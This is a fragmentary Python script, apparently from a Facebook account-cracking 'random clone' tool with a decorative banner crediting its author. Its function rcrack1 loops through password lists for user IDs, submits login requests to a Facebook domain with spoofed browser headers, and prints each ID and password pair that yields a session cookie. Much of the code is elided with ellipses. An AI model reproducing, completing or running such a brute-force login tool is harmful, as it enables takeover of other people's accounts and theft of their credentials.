...
•▀▀ ▀▀ ▀▀▀ ▀▀  █▪▀▀▀ ▀█▄▀▪▀▀ █▪
        ...
        \x1b[37;41m\t WELLCOME TO XEMON\x1b[0;m\n\n\x1b[1;37m                          
\33[1;37m----------------------------------------------
→   Owner      : EMON KHAN
→   Facebook   :  EMONKHALIFAX
→   Github     :  X
→   Tool Type  :  FOR YOU 
\x1b[1;97m→   Version    :  10K
\33[1;37m----------------------------------------------
""")                                              
...
class Main:
    ...
    def __init__(self):
        ...
        #os.system('espeak -a 200 "Welcome xemon  project Random Clone"')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            "login":"Log In"}
            headers_freefb = { 'authority': 'web.alpha.facebook.com',
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6270.219 Safari/537.36',
    'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[xemon-OK💉] {uid} | {ps}")
